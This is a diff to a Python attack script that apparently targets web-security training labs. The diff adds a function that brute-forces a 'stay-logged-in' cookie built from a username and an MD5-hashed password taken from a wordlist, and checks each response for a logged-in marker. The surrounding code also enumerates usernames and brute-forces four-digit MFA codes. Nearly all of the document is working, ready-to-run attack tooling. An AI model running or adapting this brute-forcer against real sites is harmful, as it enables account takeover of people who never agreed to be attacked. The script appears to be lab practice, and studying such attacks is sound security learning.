@@ -1,9 +1,12 @@
+import base64
+import hashlib
 import requests
 import sys
 import time
 
 from io import BytesIO
 from lxml import etree
+from pathlib import Path
 from urllib.parse import urlparse
 
 TARGET = ''
@@ -12,12 +15,12 @@ USERS_LIST = 'authentication/wordlists/usernames_acc_lock.txt'
 PASSWORD_LIST = 'authentication/wordlists/passwords.txt'
 USER_INPUT_NAME = 'username'
 PASSWORD_INPUT_NAME = 'password'
-SEARCH_TERM = 'Incorrect security code'
+SEARCH_TERM = 'Update email'
 DELAY = 90
 DELAYED_REQUEST = 3
-USERNAME = 'wiener'
+USERNAME = 'carlos'
 PASSWORD = 'peter'
-COOKIE_NAME = 'verify'
+COOKIE_NAME = 'stay-logged-in'
 COOKIE_VALUE = 'carlos'
 CODE_INPUT_NAME = 'mfa-code'
 DIGITS = 4
@@ -166,7 +169,37 @@ def enumerate_mfa_code( target: str, code_input_name: str, cookie_name: str, coo
         else:
             print(f'Authenticated successfully using verification code {code}.')
             return code
-        
+
+def enumerate_cookie(target: str, cookie_name: str, username: str, password_list: str | Path, search_term: str, timeout=10) -> dict | None:
+    try:
+        with open(password_list, 'r') as pwd_list:
+            for pwd in pwd_list:
+                encrpyted_pwd = hashlib.md5(pwd.strip().encode()).hexdigest()
+                payload = base64.b64encode(f'{username}:{encrpyted_pwd}'.encode()).decode()
+
+                cookie_jar = requests.cookies.RequestsCookieJar()
+                cookie_jar.set(cookie_name, payload, domain=urlparse(target).netloc, path='/')
+                
+                try:
+                    response = requests.get(target, cookies=cookie_jar, timeout=timeout)
+                except requests.RequestException as e:
+                    print(f'Request failed for {pwd}: {e}')
+                    continue
+
+                if not search_tree(response.content, search_term):
+                    print(f'Password {pwd} failed.')
+                else:
+                    print(f'Password {pwd} was successful.')
+                    print(f'The cookie is {cookie_name}: {payload}')
+                    return {cookie_name: payload}
+    except FileNotFoundError as e:
+        print(f'The file was not found: {e}')
+        sys.exit()
+    except Exception as e:
+        print(f'An error occurred: {e}')
+        sys.exit()
+
+
 def get_params(content: bytes) -> dict[str, str | None]:
     params: dict[str, str | None] = {}
     parser = etree.HTMLParser()
@@ -197,7 +230,7 @@ if __name__ == '__main__':
         DELAY,
         DELAYED_REQUEST,
         TIMEOUT
-    )'''
+    )
     enumerate_mfa_code(
         TARGET,
         CODE_INPUT_NAME,
@@ -205,5 +238,13 @@ if __name__ == '__main__':
         COOKIE_VALUE,
         SEARCH_TERM,
         DIGITS,
+        TIMEOUT
+    )'''
+    enumerate_cookie(
+        TARGET,
+        COOKIE_NAME,
+        USERNAME,
+        PASSWORD_LIST,
+        SEARCH_TERM,
         TIMEOUT
     )
